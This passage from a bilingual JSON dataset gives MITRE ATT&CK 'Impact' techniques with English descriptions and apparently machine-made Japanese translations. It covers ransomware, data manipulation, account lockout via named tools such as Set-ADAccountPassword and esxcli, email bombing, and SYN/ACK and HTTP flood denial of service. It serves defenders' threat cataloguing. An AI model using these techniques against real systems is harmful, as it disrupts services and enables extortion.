                "description_jp": "攻撃者は、恐喝、ソーシャルエンジニアリング、技術的な窃取、または被害者がこれらのリソースを利用できるようにすることを犠牲にして自らの金銭的利益を目的としたその他の手法によって、ターゲットから金銭的リソースを窃取する可能性があります。金銭的窃盗は、ランサムウェアによる恐喝、(引用：FBI-ransomware)ビジネスメール侵害(BEC)と詐欺、(引用：FBI-BEC)「pig butchering」、(引用：wired-pig butchering)銀行ハッキング、(引用：DOJ-DPRK Heist)暗号通貨ネットワークの悪用など、いくつかの一般的なキャンペーンタイプの最終目的である(引用：BBC-Ronin)。\n\n敵対者は、不正送金を行うために[Compromise Accounts](https://attack.mitre.org/techniques/T1586)を行う可能性がある(引用：Internet crime report 2022)。ビジネスメールの漏洩やメール詐欺の場合、敵対者は信頼されたエンティティの[Impersonation](https://attack.mitre.org/techniques/T1656)を利用する可能性がある。ソーシャル・エンジニアリングが成功すると、被害者はだまされて、敵対者が管理する金融口座に送金される可能性がある(引用：FBI-BEC)。このため、金融窃盗を含むインシデントでは、複数の被害者(すなわち、侵害された口座と最終的な金銭的損失)が発生する可能性がある(引用：VEC)。\n\nランサムウェアによる恐喝は、例えば、敵対者がデータの[Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)（引用：NYT-Colonial）や[Exfiltration](https://attack.mitre.org/tactics/TA0010)の後に被害者に支払いを要求し、その後、敵対者に支払いが行われない限り機密データを公衆に漏えいすると脅迫する場合に発生する可能性がある(引用：Mandiant-leaks) 敵対者は、被害者データを配布するために専用の漏えいサイトを使用することがある(引用：Crowdstrike-leaks)\n\n金銭的窃取はビジネスに甚大な影響を与える可能性があるため、敵対者は金銭的窃取の可能性を悪用し、金銭的利益を求めて、[Data Destruction](https://attack.mitre.org/techniques/T1485)やビジネスの混乱といった真の目的から注意をそらす可能性がある(引用：AP-NotPetya)。",
                "subtechniques": []
            },
            {
                "id": "T1565",
                "name_eng": "Data Manipulation",
                "name_jp": "データ操作",
                "description_eng": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "description_jp": "敵対者は、外部の結果に影響を与えたり、活動を隠したりするために、データを挿入、削除、操作することがあり、データの完全性を脅かす。（引用：Sygnia Elephant Beetle Jan 2022） 敵対者は、データを操作することによって、ビジネスプロセス、組織の理解、意思決定に影響を与えようとする可能性がある。\n\nどのような変更を加え、どのような影響を与えるかは、対象となるアプリケーションやプロセス、敵対者の目標や目的によって異なります。複雑なシステムの場合、敵対者はシステムに関連する特別な専門知識と、場合によっては特別なソフトウェアへのアクセスを必要とするでしょう。",
                "subtechniques": [
                    {
                        "id": "T1565.002",
                        "name_eng": "Transmitted Data Manipulation",
                        "name_jp": "送信データの操作",
                        "description_eng": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                        "description_jp": "敵対者は、外部の結果を操作したり、活動を隠蔽したりするために、ストレージや他のシステムに送信される途中のデータを改ざんし、データの完全性を脅かす可能性がある(引用: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) 送信されたデータを操作することで、敵対者はビジネスプロセス、組織の理解、意思決定に影響を与えようとする可能性がある。\n\n操作の可能性は、ネットワーク接続上、または情報を傍受して変更するツールを展開する機会があるシステムプロセス間にあるかもしれません。どのような変更が行われ、それがどのような影響を与えるかは、標的となる伝達メカニズムや敵対者の目標や目的によって異なります。複雑なシステムの場合、敵対者はおそらく特別な専門知識を必要とし、場合によってはシステムに関連する特殊なソフトウェアにアクセスする必要がある。"
                    },
                    {
                        "id": "T1565.003",
                        "name_eng": "Runtime Data Manipulation",
                        "name_jp": "ランタイム・データ操作",
                        "description_eng": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                        "description_jp": "敵対者は、エンドユーザーにアクセスされ表示されるデータを操作するためにシステムを修正し、データの完全性を脅かす可能性がある(引用：FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) ランタイムデータを操作することで、敵対者はビジネスプロセス、組織理解、意思決定に影響を与えようとする可能性がある。\n\n敵対者は、ランタイム操作を引き起こすために、データを表示するために使用されるアプリケーションバイナリを変更する可能性があります。攻撃者はまた、同様の影響を引き起こすために、[デフォルトファイル関連付けの変更](https://attack.mitre.org/techniques/T1546/001)及び[マスカレード](https://attack.mitre.org/techniques/T1036)を行うかもしれない。修正のタイプとそれがもたらす影響は、敵対者の目標と目的だけでなく、ターゲットとなるアプリケーションとプロセスに依存します。複雑なシステムの場合、敵対者は恐らく特別な専門知識を必要とし、場合によってはシステムに関連する専門的なソフ トウェアにアクセスする必要があります。"
                    },
                    {
                        "id": "T1565.001",
                        "name_eng": "Stored Data Manipulation",
                        "name_jp": "保存データの操作",
                        "description_eng": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                        "description_jp": "敵対者は、外部の結果に影響を与えたり、活動を隠したりするために、静止状態のデータを挿入、削除、操作する可能性があり、データの完全性を脅かす(引用: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) 保存されたデータを操作することで、敵対者はビジネスプロセス、組織の理解、意思決定に影響を与えようとする可能性がある。\n\n保存データには、Officeファイル、データベース、保存された電子メール、カスタムファイル形式など、さまざまなファイル形式が含まれます。どのような変更が行われ、それがどのような影響を及ぼすかは、データの種類や敵対者の目標や目的によって異なります。複雑なシステムの場合、敵対者はおそらく特別な専門知識を必要とし、場合によってはシステムに関連する特殊なソフトウェアにアクセスする必要があります。"
                    }
                ]
            },
            {
                "id": "T1531",
                "name_eng": "Account Access Removal",
                "name_jp": "アカウント・アクセスの削除",
                "description_eng": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, the <code>passwd</code> utility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (`system account set`, `system account remove`).\n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective.",
                "description_jp": "攻撃者は、正当なユーザが利用するアカウントへのアクセスを阻害することで、システムやネットワーク・リソースの利用を妨害する可能性がある。アカウントは削除、ロック、または操作（例：認証情報の変更）され、アカウントへのアクセスを削除することができる。また、攻撃者は、悪意のある変更を設定するために、ログオフおよび/または[システムシャットダウン/再起動](https://attack.mitre.org/techniques/T1529)を実行する可能性があります。(引用：CarbonBlack LockerGoga 2019)(引用：Unit42 LockerGoga 2019)\n\nWindowsでは、[Net](https://attack.mitre.org/software/S0039)ユーティリティ、<code>Set-LocalUser</code>および<code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレットが、敵対者によってユーザーアカウントを変更するために使用される可能性があります。また、アカウントはグループ ポリシーによって無効にされる可能性もあります。Linux では、<code>passwd</code> ユーティリティがパスワードを変更するために使用される可能性があります。ESXi サーバーでは、esxcli (`system account set`, `system account remove`) を使ってアカウントを削除したり変更したりすることができる。\n\nランサムウェアや類似の攻撃を使用する攻撃者は、[データ破壊](https://attack.mitre.org/techniques/T1485)や[改ざん](https://attack.mitre.org/techniques/T1491)のような、インシデントレスポンス/リカバリを妨害するために、[インパクトのためのデータ暗号化](https://attack.mitre.org/techniques/T1486)の目的を完了する前に、まずこの動作やその他のインパクト動作を実行する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1486",
                "name_eng": "Data Encrypted for Impact",
                "name_jp": "データの暗号化によるインパクト",
                "description_eng": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",
                "description_jp": "攻撃者は、ターゲット・システムやネットワーク上の多数のシステム上のデータを暗号化し、システムやネットワーク・リソースへのアクセスを妨害する。ローカルやリモートのドライブ上のファイルやデータを暗号化し、復号化キーへのアクセスを禁じることで、保存データをアクセス不能にしようとすることもある。これは、復号化または復号化キー（ランサムウェア）と引き換えに被害者から金銭的な補償を引き出すため、またはキーが保存または送信されない場合にデータを永久にアクセス不能にするために行われることがある。 引用：US-CERT Ransomware 2016）（引用：FireEye WannaCry 2017）（引用：US-CERT NotPetya 2017）（引用：US-CERT SamSam 2018\n\nランサムウェアの場合、Office文書、PDF、画像、動画、音声、テキスト、ソースコードファイルなどの一般的なユーザーファイルが暗号化されるのが一般的です（そして多くの場合、特定のファイルマーカーでリネームおよび/またはタグ付けされます）。攻撃者は、これらのファイルのロックを解除したり、操作するためのアクセスを得るために、まず [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)や[System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529)などの他の動作を行う必要があるかもしれません。(引用: CarbonBlack Conti July 2020) 場合によっては、敵対者は、重要なシステムファイル、ディスクパーティション、およびMBRを暗号化することがあります(引用: US-CERT NotPetya 2017) また、敵対者は、ESXiまたはその他のハイパーバイザー上でホストされている仮想マシンを暗号化することもあります(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\n標的組織への影響を最大化するために、データを暗号化するように設計されたマルウェアは、[Valid Accounts](https://attack.mitre.org/techniques/T1078)、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)、[SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)などの他の攻撃手法を活用してネットワーク全体に伝播するワームのような機能を備えている場合があります。(引用: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) 暗号化マルウェアは、被害者の壁紙やESXiサーバのログインメッセージを変更するなどの[Internal Defacement](https://attack.mitre.org/techniques/T1491/001)を活用したり、接続されているプリンタに身代金請求書やその他のメッセージを送信して被害者を脅迫したりすることもあります(「print bombing」として知られています)(引用: NHS Digital Egregor Nov 2020)(Citation: Varonis)\n\nクラウド環境では、侵害されたアカウント内のストレージオブジェクトも暗号化される可能性がある(引用：Rhino S3 Ransomware Part 1) 例えばAWS環境では、敵対者はAWSのServer-Side Encryption with Customer Provided Keys (SSE-C)などのサービスを活用してデータを暗号化する可能性がある(引用：Halcyon AWS Ransomware 2025)",
                "subtechniques": []
            },
            {
                "id": "T1667",
                "name_eng": "Email Bombing",
                "name_jp": "メール爆撃",
                "description_eng": "Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.(Citation: sophos-bombing)(Citation: krebs-email-bombing)\n\nAn adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim’s inbox.(Citation: krebs-email-bombing)(Citation: hhs-email-bombing)\n\nBy sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.(Citation: hhs-email-bombing) This behavior can also be used as a tool of harassment.(Citation: krebs-email-bombing)\n\nThis behavior may be a precursor for [Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004). For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use of [Remote Access Software](https://attack.mitre.org/techniques/T1663) to steal credentials, deploy ransomware, conduct [Financial Theft](https://attack.mitre.org/techniques/T1657)(Citation: sophos-bombing), or engage in other malicious activity.(Citation: rapid7-email-bombing)",
                "description_jp": "攻撃者は、標的とした電子メールアドレスに圧倒的な量のメッセージを殺到させる可能性がある。これにより、正当なメールがスパムの洪水に埋もれてしまい、業務に支障をきたす恐れがある(引用：sophos-bombing)(引用：krebs-email-bombing)\n\n敵対者は、自動化されたボットを活用し、オンラインニュースレターのような新規登録を検証しない電子メールリストに標的アドレスを登録することで、メール爆撃を達成する可能性があります。その結果、被害者の受信トレイを効果的にオーバーロードさせる何千通もの電子メールの波が押し寄せることになる。\n\n敵対者は、数百、数千の電子メールを連続して送信することで、セキュリティ警告、ヘルプデスクのチケットや顧客とのやり取りのような日常的なビジネスプロセス、または進行中の詐欺などの正当なメッセージから注意をそらし、埋もれさせてしまうことに成功する可能性がある(引用：hhs-email-bombing) この行動は、嫌がらせの道具として使用されることもある(引用：krebs-email-bombing)\n\nこの行為は[Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004)の前兆かもしれません。例えば、敵対者がターゲットに電子メールを送りつけ、その後に電話でフォローアップして不正に援助を申し出ることがある。このソーシャルエンジニアリングは、[リモートアクセスソフトウェア](https://attack.mitre.org/techniques/T1663)を使用して認証情報を盗んだり、ランサムウェアを展開したり、[金銭窃盗](https://attack.mitre.org/techniques/T1657)(引用: sophos-bombing)を行ったり、その他の悪意のある活動に関与したりする可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1499",
                "name_eng": "Endpoint Denial of Service",
                "name_jp": "エンドポイントサービス拒否",
                "description_eng": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "description_jp": "攻撃者はエンドポイント DoS 攻撃を実行し、ユーザーへのサービスの可用性を低下させたり、ブロックしたりすることがあります。エンドポイント DoS は、サービスがホストされているシステム・リソースを使い果たすか、システムを悪用して持続的なクラッシュ状態を引き起こすことで実行されます。サービスの例としては、ウェブサイト、電子メールサービス、DNS、ウェブベースのアプリケーションなどがあります。敵対者は、政治的な目的（引用：FireEye OpPoisonedHandover 2016年2月）や、気晴らし（引用：FSISAC FraudNetDoS 2012年9月）、ハクティビズム、恐喝を含む他の悪意のある活動をサポートするためにDoS攻撃を行うことが観察されている（引用：Symantec DDoS 2014年10月）。\n\nエンドポイントDoSは、サービスへのアクセスを提供するために使用されるネットワークを飽和させることなく、サービスの利用を拒否します。攻撃者は、サービスを提供するシステム上でホストされているアプリケーションスタックのさまざまなレイヤーをターゲットにすることができます。これらのレイヤーには、オペレーティング・システム（OS）、ウェブ・サーバー、DNS サーバー、データベースなどのサーバー・アプリケーション、およびそれらの上に配置される（通常はウェブベースの）アプリケーションが含まれます。各レイヤーを攻撃するには、それぞれのコンポーネントに特有のボトルネックを利用した異なるテクニックが必要です。DoS攻撃は、単一のシステムから発生する場合もあれば、インターネット上に分散した複数のシステムから発生する場合もあり、一般に分散型DoS（DDoS）と呼ばれています。\n\nエンドポイントリソースに対してDoS攻撃を行うには、IPアドレスの詐称やボットネットなど、複数の手法が適用される側面がある。\n\n攻撃者は、攻撃システムの元の IP アドレスを使用したり、攻撃トラフィックを攻撃シス テムまで追跡しにくくしたり、リフレクションを可能にするために、ソース IP アドレスを詐称したりします。これにより、ネットワーク防御デバイスの送信元アドレスによるフィルタリングの有効性が低下または排除されるため、防御側の攻撃防御の難易度が高まる可能性があります。\n\nボットネットは、ネットワークやサービスに対するDDoS攻撃を行うために一般的に使用されています。大規模なボットネットは、グローバル・インターネットに広がるシステムから大量のトラフィックを生成することができます。攻撃者は、独自のボットネット・インフラを構築して制御するリソースを持っている場合もあれば、既存のボットネットの時間を借りて攻撃を行う場合もあります。DDoSの最悪のケースでは、リクエストを生成するために非常に多くのシステムが使用されるため、ターゲットのリソースを使い果たすのに十分な量のトラフィックを生成するには、各システムが少量のトラフィックを送信するだけで済みます。このような状況では、DDoSトラフィックと正当なクライアントを区別することは非常に難しくなります。ボットネットは、米国の大手銀行を標的とした2012年の一連のインシデントなど、最も有名なDDoS攻撃のいくつかで使用されています（引用：USNYAG IranianBotnet 2016年3月）。\n\nトラフィック操作が使用されるケースでは、グローバルネットワーク（トラフィックの多いゲートウェイルーターなど）に、パケットを改ざんし、正規のクライアントにネットワークパケットを大量にターゲットに向けるコードを実行させることができるポイントが存在する可能性があります。この種の機能は以前、ウェブ検閲の目的で使用されたことがある。クライアントのHTTPトラフィックが、ターゲットのウェブサーバーを圧倒するDDoSコードを生成するJavaScriptへの参照を含むように変更されたのだ（引用：ArsTechnica Great Firewall of China）。\n\n提供ネットワークを飽和させようとする攻撃については、[Network Denial of Service](https://attack.mitre.org/techniques/T1498)を参照のこと。",
                "subtechniques": [
                    {
                        "id": "T1499.003",
                        "name_eng": "Application Exhaustion Flood",
                        "name_jp": "アプリケーション枯渇洪水",
                        "description_eng": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                        "description_jp": "攻撃者は、アプリケーションのリソースを大量に消費する機能を狙ってサービス拒否（DoS）を引き起こし、アプリケーションの可用性を否定することがあります。例えば、ウェブアプリケーションの特定の機能は、非常にリソースを消費します。このような機能へのリクエストが繰り返されると、システムリソースが枯渇し、アプリケーションやサーバー自体へのアクセスが拒否される可能性があります。 引用：Arbor AnnualDoSreport Jan 2018"
                    },
                    {
                        "id": "T1499.002",
                        "name_eng": "Service Exhaustion Flood",
                        "name_jp": "サービス切れ洪水",
                        "description_eng": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",
                        "description_jp": "攻撃者は、サービス拒否（DoS）を行うために、システムが提供するさまざまなネットワークサービスを標的にすることがある。攻撃者は、DNSやウェブサービスの可用性を標的とすることが多いですが、その他のサービスも標的になっています。(引用：Arbor AnnualDoSreport Jan 2018) ウェブサーバソフトウェアは、さまざまな手段で攻撃される可能性があり、一般的に適用されるものもあれば、サービスを提供するために使用されるソフトウェアに固有のものもあります。\n\nこの種の攻撃の一例として、敵対者がウェブサーバーに大量の HTTP リクエストを送信し、ウェブサーバーやその上で実行されるアプリケーションを圧倒する単純な HTTP フラッドが知られています。このフラッドは、犠牲となるソフトウェアがサービスを提供するために必要とするさまざまなリソースをすべて使い果たし、生のボリュームに頼って目的を達成します。 引用：Cloudflare HTTPflood\n\nSSL再ネゴシエーション攻撃として知られる別のバリエーションは、SSL/TLSのプロトコル機能を利用する。SSL/TLSプロトコル・スイートには、クライアントとサーバーが、その後の安全な接続に使用する暗号化アルゴリズムに合意するためのメカニズムが含まれている。SSL再ネゴシエーションが有効になっていれば、暗号アルゴリズムの再ネゴシエーションを要求することができる。再ネゴシエーション攻撃では、敵はSSL/TLS接続を確立し、一連の再ネゴシエーション要求を行う。暗号の再ネゴシエーションには計算サイクルという意味のあるコストがかかるため、大量に実行されるとサービスの可用性に影響を与える可能性がある(引用: Arbor SSLDoS April 2012)"
                    },
                    {
                        "id": "T1499.004",
                        "name_eng": "Application or System Exploitation",
                        "name_jp": "アプリケーションまたはシステムの搾取",
                        "description_eng": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",
                        "description_jp": "攻撃者はソフトウェアの脆弱性を悪用し、アプリケーションやシステムをクラッシュさせ、ユーザーが利用できないようにする可能性があります。(引用：Sucuri BIND9 August 2015） システムによっては、クラッシュが発生すると重要なアプリケーションやサービスが自動的に再起動されることがありますが、このような脆弱性を再度悪用して、持続的なサービス拒否（DoS）状態を引き起こす可能性があります。\n\n攻撃者は、既知の、あるいはゼロデイ脆弱性を悪用して、アプリケーションやシステムをクラッシュさせるかもしれません。クラッシュまたは再起動されたアプリケーションやシステムは、[データ破壊](https://attack.mitre.org/techniques/T1485)、[ファームウェア破損](https://attack.mitre.org/techniques/T1495)、[サービス停止](https://attack.mitre.org/techniques/T1489) などの他の影響も与える可能性があり、さらに DoS 状態を引き起こし、重要な情報、アプリケーション、システムに対する可用性を否定する可能性があります。"
                    },
                    {
                        "id": "T1499.001",
                        "name_eng": "OS Exhaustion Flood",
                        "name_jp": "OS枯渇洪水",
                        "description_eng": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                        "description_jp": "攻撃者はエンドポイントのオペレーティング・システム（OS）を標的にサービス拒否（DoS）攻撃を仕掛けることがある。システムのOSは、有限のリソースを管理し、その容量に対する過度の要求によってシステム全体が圧倒されるのを防ぐ役割を担っています。このような攻撃は、システム上の実際のリソースを使い果たす必要はなく、単にOSが自らに課している制限や利用可能なリソースを使い果たす可能性があります。\n\nこれを実現するさまざまな方法が存在し、SYNフラッドやACKフラッドなどのTCP状態枯渇攻撃があります（引用：Arbor AnnualDoSreport Jan 2018）。SYNフラッドでは、過剰な量のSYNパケットが送信されますが、3ウェイTCPハンドシェイクが完了することはありません。各OSには同時に接続できるTCPコネクションの最大数が設定されているため、システムがTCPコネクションの新規リクエストを受信する能力はすぐに枯渇してしまい、サーバーが提供するあらゆるTCPサービスにアクセスできなくなります。 引用：Cloudflare SynFlood\n\nACKフラッドは、TCPプロトコルのステートフルな性質を利用している。ACKパケットの洪水がターゲットに送信される。これによりOSは、すでに確立されている関連するTCPコネクションをステートテーブルで検索することになる。ACKパケットは存在しないコネクションに対するものなので、OSはステートテーブル全体を検索して、一致するものが存在しないことを確認する必要がある。大量のパケットに対してこれを行う必要がある場合、不正なACKパケットを排除するためにサーバーが行わなければならない作業のために、計算要件がサーバーの不調や応答不能を引き起こす可能性がある。これにより、対象となるサービスを提供するために利用できるリソースが大幅に減少する。"
                    }
                ]
            },
            {
                "id": "T1496",
                "name_eng": "Resource Hijacking",
                "name_jp": "リソース・ハイジャック",
